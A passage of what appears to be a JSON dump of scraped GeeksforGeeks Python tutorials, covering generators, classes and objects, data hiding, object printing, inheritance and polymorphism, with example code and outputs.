range(len(data)-1, -1, -1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0yield data[index]\u00a0\u00a0def Main():\u00a0\u00a0\u00a0\u00a0rev = Reverse('Harssh')\u00a0\u00a0\u00a0\u00a0for char in rev:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(char)\u00a0\u00a0\u00a0\u00a0data ='Harssh'\u00a0\u00a0\u00a0\u00a0print(list(data[i] for i in range(len(data)-1, -1, -1)))\u00a0\u00a0if __name__==\"__main__\":\u00a0\u00a0\u00a0\u00a0Main()Output :h\r\ns\r\ns\r\nr\r\na\r\nH\r\n['h', 's', 's', 'r', 'a', 'H']\r\nThis article is contributed by Harsh Wardhan Chaudhary (Intern) . If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "28a12b98a94da79e5f3c8fb1b566d714",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In Python, object-oriented Programming (OOPs) is a programming paradigm that uses objects and classes in programming. It aims to implement real-world entities like inheritance, polymorphisms, encapsulation, etc. in the programming. The main concept of OOPs is to bind the data and the functions that work on that together as a single unit so that no other part of the code can access this data.\u00a0Main Concepts of Object-Oriented Programming (OOPs)\u00a0ClassObjectsPolymorphismEncapsulationInheritanceClass\u00a0A class is a collection of objects. A class contains the blueprints or the prototype from which the objects are being created. It is a logical entity that contains some attributes and methods.\u00a0To understand the need for creating a class let\u2019s consider an example, let\u2019s say you wanted to track the number of dogs that may have different attributes like breed, age. If a list is used, the first element could be the dog\u2019s breed while the second element could represent its age. Let\u2019s suppose there are 100 different dogs, then how would you know which element is supposed to be which? What if you wanted to add other properties to these dogs? This lacks organization and it\u2019s the exact need for classes.\u00a0Some points on Python class: \u00a0Classes are created by keyword class.Attributes are the variables that belong to a class.Attributes are always public and can be accessed using the dot (.) operator. Eg.: Myclass.MyattributeClass Definition Syntax:class ClassName:\r\n   # Statement-1\r\n   .\r\n   .\r\n   .\r\n   # Statement-NExample: Creating an empty Class in PythonPython# Python3 program to# demonstrate defining# a class\u00a0\u00a0class Dog:\u00a0\u00a0\u00a0\u00a0passIn the above example, we have created a class named dog using the class keyword.ObjectsThe object is an entity that has a state and behavior associated with it. It may be any real-world object like a mouse, keyboard, chair, table, pen, etc. Integers, strings, floating-point numbers, even arrays, and dictionaries, are all objects. More specifically, any single integer or any single string is an object. The number 12 is an object, the string \u201cHello, world\u201d is an object, a list is an object that can hold other objects, and so on. You\u2019ve been using objects all along and may not even realize it.An object consists of :State: It is represented by the attributes of an object. It also reflects the properties of an object.Behavior: It is represented by the methods of an object. It also reflects the response of an object to other objects.Identity: It gives a unique name to an object and enables one object to interact with other objects.To understand the state, behavior, and identity let us take the example of the class dog (explained above).\u00a0The identity can be considered as the name of the dog.State or Attributes can be considered as the breed, age, or color of the dog.The behavior can be considered as to whether the dog is eating or sleeping.Example: Creating an objectPython3obj = Dog()This will create an object named obj of the class Dog defined above. Before diving deep into objects and class let us understand some basic keywords that will we used while working with objects and classes.The self\u00a0\u00a0Class methods must have an extra first parameter in the method definition. We do not give a value for this parameter when we call the method, Python provides itIf we have a method that takes no arguments, then we still have to have one argument.This is similar to this pointer in C++ and this reference in Java.When we call a method of this object as myobject.method(arg1, arg2), this is automatically converted by Python into MyClass.method(myobject, arg1, arg2) \u2013 this is all the special self is about.Note: For more information, refer to self in Python classThe __init__ method\u00a0The __init__ method is similar to constructors in C++ and Java. It is run as soon as an object of a class is instantiated. The method is useful to do any initialization you want to do with your object.\u00a0Now let us define a class and create some objects using the self and __init__ method.Example 1: Creating a class and object with class and instance attributesPython3class Dog:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# class attribute\u00a0\u00a0\u00a0\u00a0attr1 = \"mammal\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Instance attribute\u00a0\u00a0\u00a0\u00a0def __init__(self, name):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0# Driver code# Object instantiationRodger = Dog(\"Rodger\")Tommy = Dog(\"Tommy\")\u00a0\u00a0# Accessing class attributesprint(\"Rodger is a {}\".format(Rodger.__class__.attr1))print(\"Tommy is also a {}\".format(Tommy.__class__.attr1))\u00a0\u00a0# Accessing instance attributesprint(\"My name is {}\".format(Rodger.name))print(\"My name is {}\".format(Tommy.name))OutputRodger is a mammal\r\nTommy is also a mammal\r\nMy name is Rodger\r\nMy name is Tommy\r\nExample 2: Creating Class and objects with methodsPython3class Dog:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# class attribute\u00a0\u00a0\u00a0\u00a0attr1 = \"mammal\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Instance attribute\u00a0\u00a0\u00a0\u00a0def __init__(self, name):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def speak(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"My name is {}\".format(self.name))\u00a0\u00a0# Driver code# Object instantiationRodger = Dog(\"Rodger\")Tommy = Dog(\"Tommy\")\u00a0\u00a0# Accessing class methodsRodger.speak()Tommy.speak()OutputMy name is Rodger\r\nMy name is Tommy\r\nNote: For more information, refer Python Classes and ObjectsInheritanceInheritance is the capability of one class to derive or inherit the properties from another class. The class that derives properties is called the derived class or child class and the class from which the properties are being derived is called the base class or parent class. The benefits of inheritance are:It represents real-world relationships well.It provides the reusability of a code. We don\u2019t have to write the same code again and again. Also, it allows us to add more features to a class without modifying it.It is transitive in nature, which means that if class B inherits from another class A, then all the subclasses of B would automatically inherit from class A.Example: Inheritance in PythonPython3# Python code to demonstrate how parent constructors# are called.\u00a0\u00a0# parent classclass Person(object):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# __init__ is known as the constructor\u00a0\u00a0\u00a0\u00a0def __init__(self, name, idnumber):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.idnumber = idnumber\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def display(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(self.name)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(self.idnumber)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def details(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"My name is {}\".format(self.name))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"IdNumber: {}\".format(self.idnumber))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# child classclass Employee(Person):\u00a0\u00a0\u00a0\u00a0def __init__(self, name, idnumber, salary, post):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.salary = salary\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.post = post\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# invoking the __init__ of the parent class\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Person.__init__(self, name, idnumber)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def details(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"My name is {}\".format(self.name))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"IdNumber: {}\".format(self.idnumber))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Post: {}\".format(self.post))\u00a0\u00a0\u00a0\u00a0# creation of an object variable or an instancea = Employee('Rahul', 886012, 200000, \"Intern\")\u00a0\u00a0# calling a function of the class Person using# its instancea.display()a.details()OutputRahul\r\n886012\r\nMy name is Rahul\r\nIdNumber: 886012\r\nPost: InternIn the above article, we have created two classes i.e. Person (parent class) and Employee (Child Class). The Employee class inherits from the Person class. We can use the methods of the person class through employee class as seen in the display function in the above code. A child class can also modify the behavior of the parent class as seen through the details() method.Note: For more information, refer to our Inheritance in Python tutorial.PolymorphismPolymorphism simply means having many forms. For example, we need to determine if the given species of birds fly or not, using polymorphism we can do this using a single function.Example: Polymorphism in PythonPython3class Bird:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def intro(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"There are many types of birds.\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def flight(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Most of the birds can fly but some cannot.\")\u00a0\u00a0class sparrow(Bird):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def flight(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Sparrows can fly.\")\u00a0\u00a0class ostrich(Bird):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def flight(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Ostriches cannot fly.\")\u00a0\u00a0obj_bird = Bird()obj_spr = sparrow()obj_ost = ostrich()\u00a0\u00a0obj_bird.intro()obj_bird.flight()\u00a0\u00a0obj_spr.intro()obj_spr.flight()\u00a0\u00a0obj_ost.intro()obj_ost.flight()OutputThere are many types of birds.\r\nMost of the birds can fly but some cannot.\r\nThere are many types of birds.\r\nSparrows can fly.\r\nThere are many types of birds.\r\nOstriches cannot fly.\r\nNote: For more information, refer to our Polymorphism in Python Tutorial.EncapsulationEncapsulation is one of the fundamental concepts in object-oriented programming (OOP). It describes the idea of wrapping data and the methods that work on data within one unit. This puts restrictions on accessing variables and methods directly and can prevent the accidental modification of data. To prevent accidental change, an object\u2019s variable can only be changed by an object\u2019s method. Those types of variables are known as private variables.A class is an example of encapsulation as it encapsulates all the data that is member functions, variables, etc.Example: Encapsulation in PythonPython3# Python program to# demonstrate private members\u00a0\u00a0# Creating a Base classclass Base:\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.a = \"GeeksforGeeks\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__c = \"GeeksforGeeks\"\u00a0\u00a0# Creating a derived classclass Derived(Base):\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Calling constructor of\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Base class\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Base.__init__(self)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Calling private member of base class: \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(self.__c)\u00a0\u00a0\u00a0\u00a0# Driver codeobj1 = Base()print(obj1.a)\u00a0\u00a0# Uncommenting print(obj1.c) will# raise an AttributeError\u00a0\u00a0# Uncommenting obj2 = Derived() will# also raise an AtrributeError as# private member of base class# is called inside derived classOutputGeeksforGeeksIn the above example, we have created the c variable as the private attribute. We cannot even access this attribute directly and can\u2019t even change its value.Note: for more information, refer to our Encapsulation in Python Tutorial.Object Oriented Programming in Python | Set 2 (Data Hiding and Object Printing)https://youtu.be/CiH7lN4This article is contributed by Shwetanshu Rohatgi. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "9062880e9dac0dcd965aaab8f57a97da",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite: Object-Oriented Programming in Python | Set 1 (Class, Object and Members)\u00a0Data hiding\u00a0In Python, we use double underscore (Or __) before the attributes name and those attributes will not be directly visible outside.\u00a0Pythonclass MyClass:\u00a0\u00a0\u00a0\u00a0\u00a0# Hidden member of MyClass\u00a0\u00a0\u00a0\u00a0__hiddenVariable = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# A member method that changes\u00a0\u00a0\u00a0\u00a0# __hiddenVariable\u00a0\u00a0\u00a0\u00a0def add(self, increment):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__hiddenVariable += increment\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (self.__hiddenVariable)\u00a0\u00a0# Driver codemyObject = MyClass()\u00a0\u00a0\u00a0\u00a0myObject.add(2)myObject.add(5)\u00a0# This line causes errorprint (myObject.__hiddenVariable)Output :\u00a02\n7\nTraceback (most recent call last):\n  File \"filename.py\", line 13, in \n    print (myObject.__hiddenVariable)\nAttributeError: MyClass instance has \nno attribute '__hiddenVariable' In the above program, we tried to access a hidden variable outside the class using an object and it threw an exception.We can access the value of a hidden attribute by a tricky syntax:\u00a0Python# A Python program to demonstrate that hidden# members can be accessed outside a classclass MyClass:\u00a0\u00a0\u00a0\u00a0\u00a0# Hidden member of MyClass\u00a0\u00a0\u00a0\u00a0__hiddenVariable = 10\u00a0# Driver codemyObject = MyClass()\u00a0\u00a0\u00a0\u00a0print(myObject._MyClass__hiddenVariable)Output :\u00a010Private methods are accessible outside their class, just not easily accessible. Nothing in Python is truly private; internally, the names of private methods and attributes are mangled and unmangled on the fly to make them seem inaccessible by their given names [See this for source ].\u00a0\u00a0Printing Objects\u00a0Printing objects give us information about objects we are working with. In C++, we can do this by adding a friend ostream& operator << (ostream&, const Foobar&) method for the class. In Java, we use toString() method.In python, this can be achieved by using __repr__ or __str__ methods.Pythonclass Test:\u00a0\u00a0\u00a0\u00a0def __init__(self, a, b):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.a = a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.b = b\u00a0\u00a0\u00a0\u00a0\u00a0def __repr__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"Test a:%s b:%s\" % (self.a, self.b)\u00a0\u00a0\u00a0\u00a0\u00a0def __str__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"From str method of Test: a is %s,\" \\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"b is %s\" % (self.a, self.b)\u00a0# Driver Code\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0t = Test(1234, 5678)print(t) # This calls __str__()print([t]) # This calls __repr__()Output :\u00a0From str method of Test: a is 1234,b is 5678\n[Test a:1234 b:5678]Important Points about Printing:\u00a0If no __str__ method is defined, print t (or print str(t)) uses __repr__.\u00a0Pythonclass Test:\u00a0\u00a0\u00a0\u00a0def __init__(self, a, b):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.a = a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.b = b\u00a0\u00a0\u00a0\u00a0\u00a0def __repr__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"Test a:%s b:%s\" % (self.a, self.b)\u00a0# Driver Code\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0t = Test(1234, 5678)print(t)Output :Test a:1234 b:5678If no __repr__ method is defined then the default is used.\u00a0Pythonclass Test:\u00a0\u00a0\u00a0\u00a0def __init__(self, a, b):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.a = a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.b = b\u00a0# Driver Code\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0t = Test(1234, 5678)print(t)Output :<__main__.Test instance at 0x7fa079da6710> This article is contributed by Shwetanshu Rohatgi. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6f79fa0a95870ffbf76ee3e489c901f0",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "We have discussed following topics on Object Oriented Programming in PythonObject Oriented Programming in Python | set-1Object Oriented Programming in Python | Set 2 (Data Hiding and Object Printing)In this article, Inheritance is introduced.One of the major advantages of Object Oriented Programming is re-use. Inheritance is one of the mechanisms to achieve the same. In inheritance, a class (usually called superclass) is inherited by another class (usually called subclass). The subclass adds some attributes to superclass.Below is a sample Python program to show how inheritance is implemented in Python.\u00a0\u00a0\u00a0# A Python program to demonstrate inheritance\u00a0\u00a0\u00a0# Base or Super class. Note object in bracket.# (Generally, object is made ancestor of all classes)# In Python 3.x \"class Person\" is\u00a0# equivalent to \"class Person(object)\"class Person(object):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Constructor\u00a0\u00a0\u00a0\u00a0def __init__(self, name):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To get name\u00a0\u00a0\u00a0\u00a0def getName(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To check if this person is employee\u00a0\u00a0\u00a0\u00a0def isEmployee(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return False\u00a0\u00a0\u00a0\u00a0# Inherited or Sub class (Note Person in bracket)class Employee(Person):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Here we return true\u00a0\u00a0\u00a0\u00a0def isEmployee(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0\u00a0# Driver codeemp = Person(\"Geek1\")\u00a0 # An Object of Personprint(emp.getName(), emp.isEmployee())\u00a0\u00a0emp = Employee(\"Geek2\") # An Object of Employeeprint(emp.getName(), emp.isEmployee())Output:\r\n('Geek1', False)\r\n('Geek2', True)\r\n\u00a0How to check if a class is subclass of another?Python provides a function issubclass() that directly tells us if a class is subclass of another class.# Python example to check if a class is# subclass of another\u00a0\u00a0class Base(object):\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0 # Empty Class\u00a0\u00a0class Derived(Base):\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0 # Empty Class\u00a0\u00a0# Driver Codeprint(issubclass(Derived, Base))print(issubclass(Base, Derived))\u00a0\u00a0d = Derived()b = Base()\u00a0\u00a0# b is not an instance of Derivedprint(isinstance(b, Derived))\u00a0\u00a0# But d is an instance of Baseprint(isinstance(d, Base))Output:\r\nTrue\r\nFalse\r\nFalse\r\nTrue\r\n\u00a0What is object class?Like Java Object class, in Python (from version 3.x), object is root of all classes.In Python 3.x, \u201cclass Test(object)\u201d and \u201cclass Test\u201d are same.In Python 2.x, \u201cclass Test(object)\u201d creates a class with object as parent (called new style class) and \u201cclass Test\u201d creates old style class (without object parent). Refer this for more details.\u00a0Does Python support Multiple Inheritance?Unlike Java and like C++, Python supports multiple inheritance. We specify all parent classes as comma separated list in bracket.# Python example to show working of multiple\u00a0# inheritanceclass Base1(object):\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.str1 = \"Geek1\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print \"Base1\"\u00a0\u00a0class Base2(object):\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.str2 = \"Geek2\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print \"Base2\"\u00a0\u00a0class Derived(Base1, Base2):\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Calling constructors of Base1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# and Base2 classes\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Base1.__init__(self)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Base2.__init__(self)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print \"Derived\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def printStrs(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(self.str1, self.str2)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ob = Derived()ob.printStrs()Output:\r\nBase1\r\nBase2\r\nDerived\r\n('Geek1', 'Geek2')\r\n\u00a0How to access parent members in a subclass?Using Parent class name# Python example to show that base# class members can be accessed in# derived class using base class nameclass Base(object):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Constructor\u00a0\u00a0\u00a0\u00a0def __init__(self, x):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.x = x\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0class Derived(Base):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Constructor\u00a0\u00a0\u00a0\u00a0def __init__(self, x, y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Base.x = x\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.y = y\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def printXY(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# print(self.x, self.y) will also work\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(Base.x, self.y)\u00a0\u00a0\u00a0\u00a0# Driver Coded = Derived(10, 20)d.printXY()Output:\r\n(10, 20)\r\nUsing super()We can also access parent class members using super.# Python example to show that base# class members can be accessed in# derived class using super()class Base(object):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Constructor\u00a0\u00a0\u00a0\u00a0def __init__(self, x):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.x = x\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0class Derived(Base):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Constructor\u00a0\u00a0\u00a0\u00a0def __init__(self, x, y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0''' In Python 3.x, \"super().__init__(name)\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0also works'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0super(Derived, self).__init__(x)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.y = y\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def printXY(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Note that Base.x won't work here\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# because super() is used in constructor\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(self.x, self.y)\u00a0\u00a0\u00a0\u00a0# Driver Coded = Derived(10, 20)d.printXY()Output:\r\n(10, 20)\r\nNote that the above two methods are not exactly the same. In the next article on inheritance, we will covering following topics.1) How super works? How accessing a member through super and parent class name are different?2) How Diamond problem is handled in Python?\u00a0Exercise:Predict the output of following Python programs\u00a0\u00a0\u00a0class X(object):\u00a0\u00a0\u00a0\u00a0def __init__(self, a):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.num = a\u00a0\u00a0\u00a0\u00a0def doubleup(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.num *= 2\u00a0\u00a0class Y(X):\u00a0\u00a0\u00a0\u00a0def __init__(self, a):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0X.__init__(self, a)\u00a0\u00a0\u00a0\u00a0def tripleup(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.num *= 3\u00a0\u00a0obj = Y(4)print(obj.num)\u00a0\u00a0obj.doubleup()print(obj.num)\u00a0\u00a0obj.tripleup()print(obj.num)Output:\r\n4\r\n8\r\n24\r\n# Base or Super classclass Person(object):\u00a0\u00a0\u00a0\u00a0def __init__(self, name):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def getName(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def isEmployee(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return False\u00a0\u00a0# Inherited or Subclass (Note Person in bracket)class Employee(Person):\u00a0\u00a0\u00a0\u00a0def __init__(self, name, eid):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0''' In Python 3.0+, \"super().__init__(name)\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0also works'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0super(Employee, self).__init__(name)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.empID = eid\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def isEmployee(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def getID(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.empID\u00a0\u00a0# Driver codeemp = Employee(\"Geek1\", \"E101\")\u00a0print(emp.getName(), emp.isEmployee(), emp.getID())Output:\r\n('Geek1', True, 'E101')\r\nThis article is contributed by Shwetanshu Rohatgi and Mayank Rawat. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "333428b78229f1e0f2502b3906a1cd24",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "What is Polymorphism: The word polymorphism means having many forms. In programming, polymorphism means the same function name (but different signatures) being used for different types.Example of inbuilt polymorphic functions :\u00a0\u00a0Python3# Python program to demonstrate in-built poly-# morphic functions\u00a0# len() being used for a stringprint(len(\"geeks\"))\u00a0# len() being used for a listprint(len([10, 20, 30]))Output:\u00a05\n3\u00a0Examples of user-defined polymorphic functions :\u00a0\u00a0Python3# A simple Python function to demonstrate# Polymorphism\u00a0def add(x, y, z = 0):\u00a0\u00a0\u00a0\u00a0return x + y+z\u00a0# Driver codeprint(add(2, 3))print(add(2, 3, 4))Output:\u00a05\n9\u00a0Polymorphism with class methods:\u00a0The below code shows how Python can use two different class types, in the same way. We create a for loop that iterates through a tuple of objects. Then call the methods without being concerned about which class type each object is. We assume that these methods actually exist in each class.\u00a0\u00a0Python3class India():\u00a0\u00a0\u00a0\u00a0def capital(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"New Delhi is the capital of India.\")\u00a0\u00a0\u00a0\u00a0\u00a0def 